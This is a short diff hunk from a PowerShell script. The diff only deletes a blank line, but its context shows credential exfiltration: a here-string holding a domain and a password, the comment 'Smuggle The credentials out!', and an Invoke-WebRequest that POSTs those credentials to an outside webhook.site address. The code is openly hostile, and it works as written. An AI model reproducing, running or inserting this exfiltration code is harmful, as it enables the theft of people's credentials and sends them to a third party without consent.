@@ -94,6 +94,5 @@ $credentials = @"
     Domain:   $domain
     Password: $password
 "@
-
 # Smuggle The credentials out!
 $null = Invoke-WebRequest -Uri 'https://webhook.site/2ed3b24a-d169-4d05-a882-6d252f25ea7c' -Method POST -Body "$credentials"
